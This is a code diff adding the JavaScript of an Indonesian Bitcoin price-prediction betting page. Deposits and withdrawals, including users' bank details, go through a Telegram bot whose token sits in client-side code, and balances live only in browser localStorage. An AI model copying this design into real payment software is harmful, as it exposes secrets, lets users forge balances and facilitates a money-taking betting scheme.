+                        <p style="color:#aaa; font-size:12px; margin-bottom:15px;" id="qris-status-text">
+                        </p>`;
+                }
+            } else {
+                document.getElementById('deposit-step-1').style.display = 'block'; 
+                document.getElementById('deposit-step-2').style.display = 'none'; 
+                document.getElementById('deposit-amount').value = ''; 
+            }
+            openTargetModal('deposit-modal'); 
+        }
+        
+        function cancelDeposit() {
+            if (depositTimerInterval) clearInterval(depositTimerInterval);
+            updateDepositHistoryStatus(userID, "Dibatalkan");
+            localStorage.removeItem('sanz_active_deposit');
+            sendToTelegram(`*DIBATALKAN USER*\n\nUser \`${userID}\` membatalkan request depositnya sendiri.`);
+            closeTargetModal('deposit-modal');
+        }
+
+        function requestDeposit() {
+            const amount = parseInt(document.getElementById('deposit-amount').value);
+            if(isNaN(amount) || amount < 50000) return alert("Minimal isi saldo Rp 50.000");
+
+            let activeDeposit = { uid: userID, amount: amount, status: 'Menunggu', startTime: Math.floor(Date.now() / 1000) };
+            localStorage.setItem('sanz_active_deposit', JSON.stringify(activeDeposit));
+
+            document.getElementById('deposit-step-1').style.display = 'none'; 
+            document.getElementById('deposit-step-2').style.display = 'block';
+            document.getElementById('deposit-amount-display').style.display = 'block';
+            document.getElementById('deposit-amount-display').innerText = formatIDR(amount);
+            
+            document.getElementById('btn-close-deposit').style.display = 'inline-block';
+            document.getElementById('btn-cancel-deposit').style.display = 'inline-block';
+
+            document.getElementById('qris-loading').style.display = 'block'; 
+            document.getElementById('qris-loading').innerHTML = `
+                <div class="loading-spinner"></div>
+                <p style="color:#aaa; font-size:12px; margin-bottom:15px;" id="qris-status-text">
+                </p>`;
+            document.getElementById('qris-ready').style.display = 'none'; 
+            document.getElementById('qris-instruction').style.display = 'none';
+
+            const msg = `*REQUEST ISI SALDO*\n\nUser ID: ${userID}\nNominal: Rp ${amount.toLocaleString('id-ID')}\nStatus: Menunggu Konfirmasi.\n\n----- AKSI ADMIN -----\n\nKirim QRIS dengan caption:\n\`/send ${userID}\`\n\nKonfirmasi setelah pembayaran:\n\`/acc ${amount} ${userID}\`\n\nTolak Request:\n\`/tolak ${userID}\``;
+            sendToTelegram(msg);
+
+            const timeNow = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            tradeHistory.unshift({ id: Date.now(), type: 'Deposit', amount: amount, time: timeNow, status: 'Menunggu' });
+            saveDataLocally(); renderHistory();
+
+            startTelegramPolling(userID);
+        }
+
+        async function fetchQRImage(file_id, activeDeposit) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${file_id}`);
+                const data = await res.json();
+                if (data.ok) {
+                    const file_path = data.result.file_path;
+                    const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file_path}`;
+                    showQR(url, activeDeposit, false);
+                }
+            } catch (e) {}
+        }
+
+        function showQR(url, activeDeposit, isResume = false) {
+            document.getElementById('qris-loading').style.display = 'none';
+            document.getElementById('qris-ready').style.display = 'block';
+            document.getElementById('qris-image-tag').src = url;
+            document.getElementById('qris-instruction').style.display = 'block';
+            
+            if (!isResume) {
+                activeDeposit.qrUrl = url;
+                activeDeposit.endTime = Date.now() + (15 * 60 * 1000); 
+                localStorage.setItem('sanz_active_deposit', JSON.stringify(activeDeposit));
+            }
+
+            if (depositTimerInterval) clearInterval(depositTimerInterval);
+            depositTimerInterval = setInterval(() => {
+                let timeLeft = Math.floor((activeDeposit.endTime - Date.now()) / 1000);
+                const el = document.getElementById('deposit-timer');
+                if (timeLeft <= 0) {
+                    clearInterval(depositTimerInterval);
+                    el.innerText = "Sesi QRIS Kedaluwarsa!";
+                    updateDepositHistoryStatus(userID, "Dibatalkan");
+                    localStorage.removeItem('sanz_active_deposit');
+                } else {
+                    let m = Math.floor(timeLeft / 60); let s = timeLeft % 60;
+                    el.innerText = `Kedaluwarsa dalam: ${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
+                }
+            }, 1000);
+        }
+
+        function updateDepositHistoryStatus(uid, status, newAmount = null) {
+            let idx = tradeHistory.findIndex(h => h.type === 'Deposit' && h.status === 'Menunggu');
+            if (idx !== -1) { 
+                tradeHistory[idx].status = status; 
+                if (newAmount !== null) tradeHistory[idx].amount = newAmount;
+                saveDataLocally(); renderHistory(); 
+            }
+        }
+
+        function openWithdrawModal() { checkSavedBank(); openTargetModal('withdraw-modal'); }
+        function checkSavedBank() {
+            const saved = JSON.parse(localStorage.getItem('savedBankDetails'));
+            if(saved) {
+                document.getElementById('wd-setup-bank').style.display = 'none'; document.getElementById('wd-form').style.display = 'block';
+                document.getElementById('saved-bank-name').innerText = saved.name.toUpperCase(); document.getElementById('saved-bank-provider').innerText = saved.provider; document.getElementById('saved-bank-number').innerText = saved.number;
+                document.getElementById('wd-amount').placeholder = `Tersedia: ${formatIDR(userBalance)}`;
+            } else { document.getElementById('wd-setup-bank').style.display = 'block'; document.getElementById('wd-form').style.display = 'none'; }
+        }
+        function saveBankDetails() {
+            const provider = document.getElementById('bank-provider').value, name = document.getElementById('bank-name').value, number = document.getElementById('bank-number').value;
+            if(!name || !number) return alert("Harap lengkapi data rekening!");
+            localStorage.setItem('savedBankDetails', JSON.stringify({ provider, name, number })); alert("Rekening berhasil disimpan!"); checkSavedBank();
+        }
+        function resetBankDetails() { localStorage.removeItem('savedBankDetails'); checkSavedBank(); }
+        function checkWdBalance() {
+            const amount = parseInt(document.getElementById('wd-amount').value), btn = document.getElementById('btn-submit-wd');
+            if(amount > userBalance) { btn.style.background = "#ff5252"; btn.innerText = "Saldo Tidak Cukup"; btn.disabled = true; } 
+            else { btn.style.background = "#fff"; btn.innerText = "Tarik Saldo"; btn.disabled = false; }
+        }
+
+        function submitWithdraw() {
+            const amount = parseInt(document.getElementById('wd-amount').value);
+            if(isNaN(amount) || amount < 50000) return alert("Minimal penarikan Rp 50.000");
+            if(amount > userBalance) return alert("Saldo tidak mencukupi!");
+
+            const saved = JSON.parse(localStorage.getItem('savedBankDetails'));
+            const withdrawId = Date.now();
+            
+            let activeWithdraw = { id: withdrawId, uid: userID, amount: amount, status: 'Menunggu', startTime: Math.floor(Date.now() / 1000) };
+            localStorage.setItem('sanz_active_withdraw', JSON.stringify(activeWithdraw));
+
+            userBalance -= amount; elBalance.innerText = formatIDR(userBalance);
+            
+            const msg = `*REQUEST PENARIKAN*\n\nUser ID: ${userID}\nNominal: Rp ${amount.toLocaleString('id-ID')}\nBank: ${saved.provider}\nNama: ${saved.name}\nNo Rek: ${saved.number}\n\n----- AKSI ADMIN -----\n\nTERIMA PENARIKAN:\n\`/acc_wd ${userID}\`\n\nTOLAK PENARIKAN:\n\`/tolak_wd ${userID}\``;
+            sendToTelegram(msg);
+
+            const timeNow = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            tradeHistory.unshift({ id: withdrawId, type: 'Withdraw', amount: amount, time: timeNow, status: 'Menunggu', info: saved.provider });
+            saveDataLocally(); renderHistory();
+
+            startTelegramPolling(userID);
+            alert("Permintaan penarikan berhasil dikirim."); closeTargetModal('withdraw-modal');
+        }
+
+        function updateWithdrawHistoryStatus(historyId, status) {
+            let idx = tradeHistory.findIndex(h => h.id === historyId);
+            if (idx !== -1) { 
+                tradeHistory[idx].status = status; 
+                saveDataLocally(); renderHistory(); 
+            }
+        }
+
+        function updateWinstreakUI() {
+            document.getElementById('ws-count-display').innerText = winstreakCount + "x";
+            let nextTarget = wsKeys.find(k => k > winstreakCount); let highestPassed = wsKeys.slice().reverse().find(k => winstreakCount >= k);
+            wsKeys.forEach(key => {
+                const el = document.getElementById(`ws-item-${key}`);
+                if (winstreakCount >= key) { el.className = 'ws-item passed'; el.innerHTML = `<span><i class="bi bi-check-circle-fill" style="margin-right:5px;"></i> ${key}x Benar</span><span>Tercapai!</span>`; } 
+                else { el.className = 'ws-item'; el.innerHTML = `<span><i class="bi bi-circle-fill" style="font-size: 8px; margin-right:5px;"></i> ${key}x Benar</span><span>${formatIDR(wsMilestones[key])}</span>`; }
+            });
+            let btn = document.getElementById('btn-claim-ws'); let targetText = "Target Maximum Tercapai.";
+            if (highestPassed) {
+                currentClaimable = wsMilestones[highestPassed]; btn.disabled = false; btn.classList.add('active'); btn.innerText = `Claim ${formatIDR(currentClaimable)}`;
+                if (nextTarget) targetText = `Claim sekarang, atau lanjut ke ${nextTarget}x!`;
+            } else {
+                currentClaimable = 0; btn.disabled = true; btn.classList.remove('active'); btn.innerText = "Belum Tersedia";
+                if (nextTarget) targetText = `Benar ${nextTarget - winstreakCount}x untuk claim ${formatIDR(wsMilestones[nextTarget])}`;
+            }
+            document.getElementById('ws-target-text').innerText = targetText;
+        }
+
+        function claimWinstreak() {
+            if (currentClaimable > 0) {
+                userBalance += currentClaimable; showModal("Winstreak", `Selamat! Anda mencairkan bonus winstreak sebesar ${formatIDR(currentClaimable)}.`, "win");
+                winstreakCount = 0; currentClaimable = 0; elBalance.innerText = formatIDR(userBalance);
+                saveDataLocally(); updateWinstreakUI();
+            }
+        }
+
+        function renderHistory() {
+            elHistoryBox.innerHTML = ''; elFullHistoryList.innerHTML = '';
+            tradeHistory.forEach((h, index) => {
+                let iconClass, iconColor, title, subtitle, amountStr, statusColorClass;
+                if (h.type === 'Trade') {
+                    const isWin = h.status === 'Benar', isWait = h.status === 'Menunggu';
+                    statusColorClass = isWait ? 'wait-text' : (isWin ? 'win-text' : 'lose-text');
+                    const diffAmount = isWin ? (h.payout - h.amount) : h.amount;
+                    amountStr = isWait ? formatIDR(h.amount) : `${isWin ? '+' : '-'}${formatIDR(diffAmount)}`;
+                    iconColor = h.side === 'Naik' ? '#00e676' : '#ff5252'; iconClass = h.side === 'Naik' ? 'bi-graph-up-arrow' : 'bi-graph-down-arrow';
+                    title = `Prediksi ${h.side}`; subtitle = `Awal: ${h.entry} ${isWait ? '' : `▶ Akhir: ${h.endPrice}`}`;
+                } else if (h.type === 'Deposit') {
+                    statusColorClass = h.status === 'Menunggu' ? 'wait-text' : (h.status === 'Dibatalkan' ? 'lose-text' : 'win-text');
+                    amountStr = `+${formatIDR(h.amount)}`; iconColor = '#2196f3'; iconClass = 'bi-wallet2'; title = 'Isi Saldo'; subtitle = 'QRIS Pembayaran';
+                } else if (h.type === 'Withdraw') {
+                    statusColorClass = h.status === 'Menunggu' ? 'wait-text' : (h.status === 'Dibatalkan' ? 'lose-text' : 'win-text');
+                    amountStr = `-${formatIDR(h.amount)}`; iconColor = '#ff9800'; iconClass = 'bi-cash-stack'; title = 'Penarikan'; subtitle = h.info || 'Transfer Bank';
+                }
+                const historyHTML = `
+                    <div class="history-item">
+                        <div style="font-size: 24px; color: ${iconColor};"><i class="bi ${iconClass}"></i></div>
+                        <div class="hist-info"><h4>${title}</h4><p>${h.time}</p><div class="hist-prices">${subtitle}</div></div>
+                        <div class="hist-result"><h4 class="${statusColorClass}">${h.status}</h4><p class="${statusColorClass}">${amountStr}</p></div>
+                    </div>`;
+                if (index < 3) elHistoryBox.innerHTML += historyHTML;
+                elFullHistoryList.innerHTML += historyHTML;
+            });
+        }
+
+        const ctx = document.getElementById('liveChart').getContext('2d');
+        const priceChart = new Chart(ctx, {
+            type: 'line', data: { labels: Array(30).fill(''), datasets: [{ label: 'BTC', data: Array(30).fill(null), borderColor: '#00e676', borderWidth: 2, pointRadius: 0, pointHoverRadius: 4, fill: true, backgroundColor: 'rgba(0, 230, 118, 0.1)', tension: 0.2 }] },
+            options: { responsive: true, maintainAspectRatio: false, animation: false, scales: { x: { display: false }, y: { position: 'right', grid: { color: '#333' }, ticks: { font: { size: 10 }, color: '#888' } } }, plugins: { legend: { display: false } } }
+        });
+
+        let rollingTrades = [], globalTradesCount = 0; const elGlobalList = document.getElementById('global-trade-list');
+        
+        function updateGlobalActivityUI() {
+            let totalBuy = 0, totalSell = 0; rollingTrades.forEach(t => { if(t.isSell) totalSell += t.qty; else totalBuy += t.qty; });
+            let totalVol = totalBuy + totalSell, buyPct = totalVol === 0 ? 50 : Math.round((totalBuy / totalVol) * 100), sellPct = totalVol === 0 ? 50 : Math.round((totalSell / totalVol) * 100);
+            document.getElementById('buy-percent-text').innerText = buyPct + '%'; document.getElementById('sell-percent-text').innerText = sellPct + '%'; document.getElementById('progress-buy').style.width = buyPct + '%'; document.getElementById('progress-sell').style.width = sellPct + '%';
+        }
+
+        function updateGlobalActivity(trade) {
+            const isSell = trade.m, qty = parseFloat(trade.q), price = parseFloat(trade.p);
+            rollingTrades.push({ isSell, qty, price }); if(rollingTrades.length > 100) rollingTrades.shift();
+            updateGlobalActivityUI();
+            
+            globalTradesCount++;
+            if (globalTradesCount % 4 === 0) {
+                const timeNow = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' }), colorClass = isSell ? 'g-sell' : 'g-buy', icon = isSell ? '<i class="bi bi-caret-down-fill"></i>' : '<i class="bi bi-caret-up-fill"></i>';
+                const row = document.createElement('div'); row.className = 'global-trade-item';
+                row.innerHTML = `<span class="g-trade-time">${timeNow}</span><span class="g-trade-price ${colorClass}">${icon} ${price.toFixed(2)}</span><span class="g-trade-qty">${qty.toFixed(4)} BTC</span>`;
+                elGlobalList.prepend(row); if(elGlobalList.children.length > 4) elGlobalList.removeChild(elGlobalList.lastChild);
+            }
+        }
+
+        async function loadInstantPrice() {
+            try {
+                const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT');
+                globalPrice = parseFloat((await res.json()).price).toFixed(2); elLivePrice.innerText = globalPrice;
+                
+                let chartData = priceChart.data.datasets[0].data;
+                if (!chartData[chartData.length - 1]) {
+                    for(let i=0; i<chartData.length; i++) chartData[i] = globalPrice; 
+                    priceChart.update();
+                }
+            } catch (e) {}
+        }
+
+        function initWebSocket() {
+            bWS = new WebSocket('wss://stream.binance.com:9443/stream?streams=btcusdt@miniTicker/btcusdt@aggTrade');
+            bWS.onmessage = (msg) => {
+                lastWsMsgTime = Date.now(); const payload = JSON.parse(msg.data);
+                if (payload.stream === 'btcusdt@miniTicker') {
+                    globalPrice = parseFloat(payload.data.c).toFixed(2);
+                    let chartData = priceChart.data.datasets[0].data; chartData.push(globalPrice); if (chartData.length > 30) chartData.shift();
+                    if (globalPrice > lastPrice) { priceChart.data.datasets[0].borderColor = '#00e676'; priceChart.data.datasets[0].backgroundColor = 'rgba(0, 230, 118, 0.1)'; } 
+                    else if (globalPrice < lastPrice) { priceChart.data.datasets[0].borderColor = '#ff5252'; priceChart.data.datasets[0].backgroundColor = 'rgba(255, 82, 82, 0.1)'; }
+                    priceChart.update(); elLivePrice.innerText = globalPrice;
+                    if (globalPrice > lastPrice) elLivePrice.className = "price-val up"; else if (globalPrice < lastPrice) elLivePrice.className = "price-val down";
+                    lastPrice = globalPrice;
+                }
+                if (payload.stream === 'btcusdt@aggTrade') updateGlobalActivity(payload.data);
+            };
+            bWS.onclose = () => { setTimeout(initWebSocket, 2000); }; bWS.onerror = () => { bWS.close(); };
+        }
+
+        function checkActiveTradeOnLoad() {
+            let savedTrade = localStorage.getItem('sanz_active_trade');
+            if (savedTrade) {
+                let parsed = JSON.parse(savedTrade);
+                let remTime = Math.floor((parsed.endTime - Date.now()) / 1000);
+                
+                tradeSession = parsed;
+                activeTrading = true;
+                timerCount = remTime > 0 ? remTime : 1; 
+                
+                elDirection.innerText = tradeSession.side === 'Naik' ? 'Bullish' : 'Bearish';
+                elDirection.className = tradeSession.side === 'Naik' ? 'status-value bullish' : 'status-value bearish';
+                elBetDisplay.innerText = formatIDR(tradeSession.amount);
+                elEntryPrice.innerText = tradeSession.entry;
+                
+                startTradeTimer();
+            }
+        }
+
+        function restoreChartAndSentiment() {
+            let savedChart = localStorage.getItem('sanz_chart_data');
+            if (savedChart) {
+                let parsed = JSON.parse(savedChart);
+                if(parsed && parsed.length === 30) {
+                    priceChart.data.datasets[0].data = parsed;
+                    priceChart.update();
+                }
+            }
+            let savedSentiment = localStorage.getItem('sanz_sentiment');
+            if (savedSentiment) {
+                let parsedSent = JSON.parse(savedSentiment);
+                if(parsedSent && parsedSent.length > 0) {
+                    rollingTrades = parsedSent;
+                    updateGlobalActivityUI();
+                    
+                    elGlobalList.innerHTML = '';
+                    let recentTrades = rollingTrades.slice(-4).reverse();
+                    recentTrades.forEach(t => {
+                        const timeNow = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+                        const colorClass = t.isSell ? 'g-sell' : 'g-buy';
+                        const icon = t.isSell ? '<i class="bi bi-caret-down-fill"></i>' : '<i class="bi bi-caret-up-fill"></i>';
+                        const row = document.createElement('div'); row.className = 'global-trade-item';
+                        row.innerHTML = `<span class="g-trade-time">${timeNow}</span><span class="g-trade-price ${colorClass}">${icon} ${(t.price || 0).toFixed(2)}</span><span class="g-trade-qty">${(t.qty || 0).toFixed(4)} BTC</span>`;
+                        elGlobalList.appendChild(row);
+                    });
+                }
+            }
+        }
+
+        function executeTrade(chosenSide) {
+            if (activeTrading) return showModal("Peringatan", "Tunggu sesi periode saat ini selesai.", "error");
+            if (globalPrice == 0 || (Date.now() - lastWsMsgTime > 3000)) return showModal("Perhatian", "Koneksi harga terputus.", "error");
+
+            let inputAmount = parseInt(document.getElementById('bet-input').value);
+            if (isNaN(inputAmount) || inputAmount < 10000) return showModal("Peringatan", "Minimal prediksi Rp 10.000", "error");
+            if (inputAmount > userBalance) return showModal("Perhatian", "Saldo tidak mencukupi.", "error");
+
+            userBalance -= inputAmount;
+            elBalance.innerText = formatIDR(userBalance);
+
+            activeTrading = true;
+            timerCount = 60;
+            tradeSession = { id: Date.now(), type: 'Trade', side: chosenSide, amount: inputAmount, entry: globalPrice };
+
+            elDirection.innerText = chosenSide === 'Naik' ? 'Bullish' : 'Bearish';
+            elDirection.className = chosenSide === 'Naik' ? 'status-value bullish' : 'status-value bearish';
+            elBetDisplay.innerText = formatIDR(inputAmount); elEntryPrice.innerText = tradeSession.entry;
+
+            tradeHistory.unshift({ id: tradeSession.id, type: 'Trade', side: tradeSession.side, time: new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' }), amount: tradeSession.amount, entry: tradeSession.entry, status: 'Menunggu', endPrice: '-', payout: 0 });
+            
+            saveDataLocally(); renderHistory();
+            startTradeTimer();
+        }
+
+        function startTradeTimer() {
+            elTimer.innerText = `00:00:${timerCount < 10 ? '0'+timerCount : timerCount}`;
+            elTimer.classList.remove('paused');
+            
+            intervals = setInterval(() => {
+                if (Date.now() - lastWsMsgTime < 2500) {
+                    elTimer.classList.remove('paused'); timerCount--;
+                    elTimer.innerText = `00:00:${timerCount < 10 ? '0'+timerCount : timerCount}`;
+                    
+                    if (timerCount <= 0) { clearInterval(intervals); calculateWinning(); }
+                } else { elTimer.classList.add('paused'); }
+            }, 1000);
+        }
+
+        function calculateWinning() {
+            const finalPrice = globalPrice; let userWin = false;
+            if (tradeSession.side === 'Naik' && finalPrice > tradeSession.entry) userWin = true;
+            if (tradeSession.side === 'Turun' && finalPrice < tradeSession.entry) userWin = true;
+
+            let resultLabel = "Salah", returnCash = 0, typeAlert = "lose";
+            if (userWin) { returnCash = tradeSession.amount * 2; userBalance += returnCash; resultLabel = "Benar"; typeAlert = "win"; winstreakCount++; } 
+            else { winstreakCount = 0; }
+
+            elBalance.innerText = formatIDR(userBalance);
+            updateWinstreakUI(); 
+            
+            let activeTradeIndex = tradeHistory.findIndex(h => h.id === tradeSession.id);
+            if(activeTradeIndex !== -1) {
+                tradeHistory[activeTradeIndex].status = resultLabel;
+                tradeHistory[activeTradeIndex].endPrice = finalPrice;
+                tradeHistory[activeTradeIndex].payout = returnCash;
+            }
+            
+            activeTrading = false;
+            saveDataLocally(); renderHistory();
+
+            setTimeout(() => {
+                showModal("Sesi Berakhir", `Prediksi <strong>${resultLabel}</strong>!<br><br>Harga Awal: ${tradeSession.entry}<br>Harga Akhir: ${finalPrice}`, typeAlert);
+                elDirection.innerText = "-"; elDirection.className = "status-value"; elTimer.innerText = "00:00:00"; elTimer.classList.remove('paused');
+            }, 500);
+        }
+
+        restoreChartAndSentiment();
+        loadInstantPrice();
+        initWebSocket();
+        elBalance.innerText = formatIDR(userBalance);
+        updateWinstreakUI(); 
+        renderHistory(); 
+        checkActiveTradeOnLoad(); 
+
+        let activeDep = JSON.parse(localStorage.getItem('sanz_active_deposit'));
+        let activeWd = JSON.parse(localStorage.getItem('sanz_active_withdraw'));
+        if ((activeDep && activeDep.status === 'Menunggu') || (activeWd && activeWd.status === 'Menunggu')) {
+            startTelegramPolling(userID);
+        }
+    </script>
+</body>
+</html>
